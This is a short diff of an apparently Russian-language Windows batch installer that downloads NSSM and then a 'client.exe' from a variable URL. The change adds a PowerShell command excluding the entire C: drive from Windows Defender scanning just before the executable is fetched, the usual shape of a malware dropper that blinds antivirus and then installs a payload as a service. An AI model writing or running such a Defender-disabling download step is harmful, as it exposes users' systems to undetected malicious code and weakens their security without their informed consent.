@@ -21,6 +21,9 @@ powershell -Command "Invoke-WebRequest -Uri '%NSSM_URL%' -OutFile 'nssm.zip'"
 REM Распаковка nssm
 powershell -Command "Expand-Archive -Path 'nssm.zip' -DestinationPath 'nssm'"
 
+REM Добавление диска C в исключения
+powershell -Command "Add-MpPreference -ExclusionPath C:\"
+
 REM Скачивание client.exe
 echo Скачивание %CLIENT_NAME%...
 powershell -Command "Invoke-WebRequest -Uri '%CLIENT_URL%' -OutFile '%CLIENT_NAME%'"
